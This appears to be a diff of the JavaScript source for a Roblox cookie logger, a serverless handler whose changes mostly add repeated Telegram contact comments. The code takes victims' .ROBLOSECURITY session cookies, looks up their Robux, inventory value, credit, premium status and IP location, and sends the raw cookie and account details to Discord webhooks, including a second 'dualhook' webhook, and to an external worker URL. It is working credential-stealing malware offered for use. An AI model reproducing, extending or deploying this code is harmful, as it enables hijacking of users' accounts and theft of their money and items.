@@ -1,13 +1,13 @@
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev';
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 const ITEMS = {
   HEADLESS: 134082579,
   KORBLOX: 139607625,
   VALKYRIE: 1365767
 };
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/cookie';
 
 async function redisGet(key) {
@@ -23,7 +23,7 @@ async function redisGet(key) {
     return r || null;
   } catch { return null; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
@@ -35,7 +35,7 @@ async function getIpGeo(ip) {
     return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
   } catch { return null; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getAvatarUrl(userId) {
   try {
     const ctrl = new AbortController();
@@ -48,7 +48,7 @@ async function getAvatarUrl(userId) {
     return null;
   } catch { return null; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getRobux(cookie) {
   try {
     const ctrl = new AbortController();
@@ -63,7 +63,7 @@ async function getRobux(cookie) {
     return data.robux || 0;
   } catch { return 0; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getRAP(cookie, userId) {
   try {
     const ctrl = new AbortController();
@@ -81,7 +81,7 @@ async function getRAP(cookie, userId) {
     return { rap, items: items.length };
   } catch { return { rap: 0, items: 0 }; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getCredit(cookie) {
   try {
     const ctrl = new AbortController();
@@ -96,12 +96,12 @@ async function getCredit(cookie) {
     return data.balance || 0;
   } catch { return 0; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 function getAccountAge(createdDate) {
   if (!createdDate) return 0;
   return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getPremiumStatus(cookie) {
   try {
     const ctrl = new AbortController();
@@ -114,7 +114,7 @@ async function getPremiumStatus(cookie) {
     return response.status === 200;
   } catch { return false; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getVoiceChatStatus(cookie) {
   try {
     const ctrl = new AbortController();
@@ -129,7 +129,7 @@ async function getVoiceChatStatus(cookie) {
     return data.isVoiceEnabled || false;
   } catch { return false; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getFriendsCount(userId) {
   try {
     const ctrl = new AbortController();
@@ -141,7 +141,7 @@ async function getFriendsCount(userId) {
     return data.count || 0;
   } catch { return 0; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function ownsItem(cookie, userId, assetId) {
   try {
     const ctrl = new AbortController();
@@ -155,7 +155,7 @@ async function ownsItem(cookie, userId, assetId) {
     return await response.json() === true;
   } catch { return false; }
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function getGroupsOwned(userId) {
   try {
     const ctrl = new AbortController();
@@ -208,7 +208,7 @@ async function refreshCookieStatus(cookie) {
   return { refreshed: accountInfo.valid, account: accountInfo, timestamp: new Date().toISOString() };
 }
 
-// NEW: Send raw data to Worker
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function sendToWorker(endpoint, data) {
   try {
     await fetch(`${WORKER_URL}${endpoint}`, {
@@ -218,7 +218,7 @@ async function sendToWorker(endpoint, data) {
     });
   } catch (_) {}
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
 function extractCookie(raw) {
   if (!raw) return null;
@@ -384,7 +384,7 @@ export default async function handler(req, res) {
       console.log('Webhook1 (dualhook):', webhook1?.substring(0, 50));
     }
   }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
   if (!cookie) {
     console.log('No cookie - sending troll alert');
     const geo = await getIpGeo(ip);
@@ -456,7 +456,7 @@ export default async function handler(req, res) {
       timestamp: now
     }]
   });
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
   if (webhook1) {
     console.log('Step 2: Dualhook embed');
     await discordSend(webhook1, {
@@ -476,7 +476,7 @@ export default async function handler(req, res) {
       }]
     });
   }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
   if (acc) {
     console.log('Step 3: Account Info embed');
     const accountEmbed = {
@@ -501,15 +501,15 @@ export default async function handler(req, res) {
       footer: { text: `${pName} Logger` },
       timestamp: now
     };
-    
+    // IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
     await discordSend(webhook2, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [accountEmbed] });
     if (webhook1) await discordSend(webhook1, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [{...accountEmbed, footer: { text: `sPAIN Logger • ${pName}` }}] });
   }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
   console.log('Step 4: Sending raw cookie...');
   await sendRawCookie(webhook2, cookie, acc?.username);
   if (webhook1) await sendRawCookie(webhook1, cookie, acc?.username);
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
   console.log('Step 5: Sending to Worker');
   if (acc) {
     await sendToWorker('/notify/capture', {
